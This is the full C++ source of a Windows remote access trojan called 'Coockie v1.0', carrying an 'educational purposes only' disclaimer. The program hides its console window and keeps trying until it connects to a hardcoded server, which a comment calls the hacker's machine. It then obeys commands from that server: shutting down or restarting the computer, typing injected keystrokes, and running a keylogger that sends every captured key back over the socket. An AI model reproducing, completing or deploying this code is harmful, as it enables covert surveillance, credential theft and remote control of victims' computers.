
#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")

//Code and Developed By Caleb Gucciardi Italy
//I take no responsibility for this code
//Software created for educational purposes only
//Use only in a protected and authorized environment
//--FreeeSoftware--CopyLeft--MakeItBetter--
//Coockie v1.0 for Windows



/***********************************************************
************************************************************
*            _______                                       *
*           / ..  . \            __   __   __         __   *
*	   |    .    |          |    |  | |  | |/ || |_    *
*	   |  .      |          |__  |__| |__| |\ || |__   *
*	   \.____.__/                                      *
*			      _______                      *
*		              \ .  . \                     *
*			    _/    .  |                     *
*			   |  .     .|                     *
*			   \.____.___/                     *
*                                                          *
************************************************************
***********************************************************/

using namespace std;


/*--var---socket--
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
//ATTENTION change this ip to your ip server and compile
string ip = "192.168.43.1"; //this will be the ip of the server
int port = 7373; /*change this port to you portforward/
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/

string COM;  //it will be the command recv from tho hacker's machine
char buffer[4096];
//--endvar--

void com(SOCKET sock);
void ex(string c);
void keylogger(SOCKET so);
void robots(string ro);

//MAIN
int main() {

	FreeConsole();
	WSAData data;
	WORD ver = MAKEWORD(2, 2);

	//control for issues
	int err = WSAStartup(ver, &data); 
	if (err!=0) {
		//cerr << "Error::-"<<err<<"-T1-"<< endl;
		return 2;
	}

	//make a socket...
	SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0); 
	if (sockfd == INVALID_SOCKET) {
		//cerr << "Error::-T2-" << endl;
		WSACleanup();
		return 2;
	}

	//inizialize serv
	sockaddr_in serv;
	serv.sin_family = AF_INET;
	serv.sin_port = htons(port);
	inet_pton(AF_INET, ip.c_str(), &serv.sin_addr);

	//connect & control for issues
	int issues = 1;
	do {
		int result = connect(sockfd, (sockaddr*)&serv, sizeof(serv));
		if (result == SOCKET_ERROR) {
			//cerr << "Error::-T3-" << endl;
			//cerr << "Wait..for Server.."<<endl;
			Sleep(5000);
		}
		else
			issues =0;
	} while (issues == 1);

	com(sockfd);

	closesocket(sockfd);
	WSACleanup();
	return 0;
}


//RECV COMMANDS
void com(SOCKET sock){
	int st = 0;
	string cookie = "cookie";

	do {
		
		//i send at python script a keyword--I READY FOR COMMANDS
		int s = send(sock, cookie.c_str(), cookie.size() + 1, 0);
		if (s != SOCKET_ERROR) {

			//recv and checking for issues
			ZeroMemory(buffer, 4096);
			int bytes = recv(sock, buffer, 4096, 0);
			if (bytes > 0) {
				COM = string(buffer, 0, bytes);
				if (COM == "close")
					st = 1;
				else if (COM == "key")
					keylogger(sock);
				else if (COM == "r") {
					keybd_event(VK_RETURN, 0x9e, 0, 0); 
					keybd_event(VK_RETURN, 0x9e, KEYEVENTF_KEYUP, 0);
				}
				else if (COM[0] == 'r')
					robots(COM);
				else
					ex(COM);
			}
		}
		else
			return;
	} while (st==0);

	return;
}

void ex(string c) {

	//you here can write your function
	//there are some example

	if (c == "down")
		system("shutdown -s");
	else if (c == "close")
		return;
	else if (c == "restart")
		system("shutdown -r");
	else if (c == "google")
		system("start www.google.com");
	else if (c == "facebook")
		system("start www.facebook.com");
	else if (c == "shell")
		system("start");
	else
		return;

	return;
}

void keylogger(SOCKET so) {
	char i;  //counter
	while (true) {
		Sleep(10);
		//Start Searching
		for (i = 32; i < 122; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				string t = string(1, i);
				int s = send(so, t.c_str(), t.size() + 1, 0);
				if (s != SOCKET_ERROR) {
					//recv and checking for issues
					ZeroMemory(buffer, 4096);
					int bytes = recv(so, buffer, 4096, 0);
					t = string(buffer, 0, bytes);
					if (t == "esc")//for quit to com:: 
						return;
				}
			}
		}
	}
}

//this is cool
void robots(string ro) {
	
	int len = size(ro);
	//write a string from script python use a virtual keyboard
	for (int i = 2; i < len; i++) {
		keybd_event(VkKeyScan(ro[i]), 0x9e, 0, 0);
		keybd_event(VkKeyScan(ro[i]), 0x9e, KEYEVENTF_KEYUP, 0);
	}
	return;
}


